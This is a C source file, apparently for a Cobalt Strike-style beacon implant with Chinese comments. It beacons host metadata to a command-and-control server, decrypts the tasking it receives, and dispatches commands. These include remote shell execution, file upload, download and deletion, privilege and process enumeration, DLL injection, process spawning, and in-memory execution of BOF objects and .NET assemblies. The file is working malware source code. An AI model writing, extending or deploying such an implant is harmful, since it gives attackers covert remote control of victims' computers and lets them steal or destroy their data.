#include "MetaData.h"
#include "Util.h"
#include "Http.h"
#include "Config.h"
#include "Command.h"
#include "Job.h"

VOID executeCommand(unsigned char* command, uint32_t command_type, size_t command_length);

VOID beacon_main() {
    // Cookie: SESSIONID = Metadata
    wchar_t* cookie_header = makeMetaData();
    if (cookie_header == NULL) {
        fprintf(stderr, "construct metadata failed\n");
        return;
    }
    while (1) {
        // 发送心跳的同时，获取响应内容
        size_t responseSize = 0;
		// 处理 Job 任务
        ProcessJobEntry(MAX_PACKET);
        unsigned char* responseEncodeData = GET(cookie_header, &responseSize);
        // 多分配一个字节为了放\0，不然后续 strlen 的长度和 responseSize 对不上
        // responseSize > 7 ==> responseSize > Prefix + Suffix
        if (responseEncodeData && responseSize > 7) {
            unsigned char* tmp = realloc(responseEncodeData, responseSize + 1);
            if (tmp) {
                responseEncodeData = tmp;
                responseEncodeData[responseSize] = '\0';
            }
            else {
                free(responseEncodeData);
                responseEncodeData = NULL;
                continue;
            }
        }

        size_t responseDataLength = 0;

        // 在这个函数还要经过一次 NetBios 解码，一次 XOR 解密对应 Mask，因为 profile 是这样写的
        unsigned char* responseData = parseGetResponse(responseEncodeData, responseSize, &responseDataLength);

        // 确保为 16 的倍数，进行 AES 解密
        if (responseData && responseDataLength > 16 && responseDataLength % 16 == 0) {
            size_t ciperTextLength = responseDataLength - 16;
            unsigned char* ciperText = responseData;

            // 开始解密指令(AES CBC)
            unsigned char* key = g_aeskey;
            size_t cbclength;
            unsigned char* cbcdata = AesCBCDecrypt(ciperText, key, ciperTextLength, &cbclength);

            if (cbcdata != NULL) {
                datap parser;
                BeaconDataParse(&parser, cbcdata, cbclength);
                // 不知道是什么
                BeaconDataInt(&parser);
                // 这四个字节是所有指令总长度
                /* 指令数据，当有多条指令发过来时结构如下
                 *  指令数据包格式：?(4 Bytes) |totalLength (4 Bytes)| cmdType(4 Bytes) | commandLen(4 Bytes)
                 *  | command(commandLen Bytes) || cmdType(4 Bytes) | commandLen(4 Bytes) | command(4 Bytes) || ...
                 */
                uint32_t totalLength = (uint32_t)BeaconDataInt(&parser);
                unsigned char* totalBuffer = BeaconDataPtr(&parser, totalLength);
                
                // 指令数据大小计数
                size_t count = 0;

                while (totalLength > 0) {
                    int callbackType = 0;
                    uint32_t command_type = 0;
                    size_t command_length = 0;
                    unsigned char* command = NULL;

                    command = parsePacket(totalBuffer, &totalLength, &command_type, &command_length, &count);

                    if (command) {
                        executeCommand(command, command_type, command_length);
                    }
                    else {
                        fprintf(stderr, "command parse error\n");
                        break;
                    }
                }
                free(cbcdata);
                cbcdata = NULL;
            }
        }
    SLEEP_NEXT:
        if (responseEncodeData) { free(responseEncodeData); responseEncodeData = NULL; }
        Sleep(g_sleeptime);
    }
    free(cookie_header);
}

int main() {
    beacon_main();
    return 0;
}

 VOID executeCommand(unsigned char* command, uint32_t command_type, size_t command_length) {
    unsigned char* postMsg = NULL;  // 此参数用于 DataProcess
    size_t msgLength = 0;           // 此参数用于 DataProcess
    int callbackType = 0;           // 此参数用于 DataProcess 不能使用 DWORD 表示 必须有符号 

    switch (command_type)
    {
    case CMD_TYPE_SLEEP:
        callbackType = -1;
        CmdChangSleepTimes(command, command_length);
        break;
    case CMD_TYPE_FILE_BROWSE:   
        callbackType = CALLBACK_PENDING;
        postMsg = CmdFileBrowse(command, command_length, &msgLength);
        break;
    case CMD_TYPE_UPLOAD_START:  
        // 如果文件已存在，会清空原有内容（文件长度变为 0）
        // 如果文件不存在，会新建文件
        // 写入时从文件开头开始写
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdUpload(command, command_length, &msgLength, "wb");
        break;
    case CMD_TYPE_UPLOAD_LOOP: 
        // 如果文件已存在，写入的位置永远在文件末尾，不会覆盖前面的内容
        // 如果文件不存在，会新建文件
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdUpload(command, command_length, &msgLength, "ab");
        break;
    case CMD_TYPE_DRIVES:       
        callbackType = CALLBACK_PENDING;
        postMsg = CmdDrives(command, command_length, &msgLength);
        break;
    case CMD_TYPE_MKDIR:        
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdMkdir(command, command_length, &msgLength);
        break;
    case CMD_TYPE_PWD:           
        callbackType = CALLBACK_PWD;
        postMsg = CmdPwd(&msgLength);
        break;
    case CMD_TYPE_CD:
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdCd(command, command_length, &msgLength);
        break;
    case CMD_TYPE_GETUID:        
        callbackType = CALLBACK_TOKEN_GETUID;
        postMsg = CmdGetUid(&msgLength);
        break;
    case CMD_TYPE_SETENV:        
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdSetEnv(command, command_length, &msgLength);
        break;
    case CMD_TYPE_RM:            
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdFileRemove(command, command_length, &msgLength);
        break;
    case CMD_TYPE_GET_PRIVS:              
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdGetPrivs(&msgLength);
        break;
    case CMD_TYPE_CP:            
		callbackType = CALLBACK_OUTPUT;
		postMsg = CmdFileCopy(command, command_length, &msgLength);
		break;
    case CMD_TYPE_MV:            
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdFileMove(command, command_length, &msgLength);
        break;
    case CMD_TYPE_DOWNLOAD:                                    
        callbackType = -1;
        CmdFileDownload(command, command_length, &msgLength);
        break;
    case CMD_TYPE_SHELL:         
        callbackType = -1;
        /*
         * 因为 CmdShell 中会创建线程，线程中会使用 commanfBuf
         * 线程结束后会自动释放 commanfBuf
         * 如果提前释放 commanfBuf 会导致线程访问已释放内存
         * 继而报错
        */
        CmdShell(command, command_length);
        break;
    case CMD_TYPE_BOF:   
        callbackType = -1;
        CmdInlineExecute(command, command_length);
        break;
    case CMD_TYPE_EXIT:  
        exit(-1);
    case CMD_TYPE_PS:    
        callbackType = -1;
        CmdPs(command, command_length);
        break;
    case CMD_TYPE_SPAWN_X64:
        callbackType = -1;
        CmdSpawn(command, command_length, FALSE, TRUE);
		break;
    case CMD_TYPE_PIPE:
        callbackType = -1;
        CmdJobRegister(command, command_length, FALSE, FALSE);
        break;
    case CMD_TYPE_JOB_REGISTER_MSGMODE:
        callbackType = -1;
        CmdJobRegister(command, command_length, FALSE, TRUE);
        break;
    case CMD_TYPE_INJECT_X64:
        callbackType = -1;
        CmdDllInject(command, command_length, FALSE);
        break;
    case CMD_TYPE_INJECT_X86:
        callbackType = -1;
        CmdDllInject(command, command_length, TRUE);
		break;
    case CMD_TYPE_JOBS:       
        callbackType = CALLBACK_JOBS;
        postMsg = CmdJobList(&msgLength);
        break;
    case CMD_TYPE_JOBS_KILL:  
        callbackType = CALLBACK_OUTPUT;
        postMsg = CmdJobKill(command, command_length, &msgLength);
        break;
    case CMD_TYPE_EXECUTE_ASSEMBLY_X64:  
        callbackType = -1;
        CmdExecuteAssembly(command, command_length);
		break;
    default:
        callbackType = CALLBACK_OUTPUT;
        unsigned char* result = "[-] This Command Do Not Accomplish";
        unsigned char* resultMemmory = (unsigned char*)malloc(strlen(result) + 1);
        if (!resultMemmory) {
            fprintf(stderr, "Memory allocation failed\n");
            return;
        }
        memcpy(resultMemmory, result, strlen(result));
        postMsg = resultMemmory;
        msgLength = strlen(result);
		postMsg[msgLength] = '\0';
        break;
    }

    // 有数据返回进入下面分支
    if (callbackType >= 0 && postMsg) {
        DataProcess(postMsg, msgLength, callbackType);
        free(postMsg);
    }
}
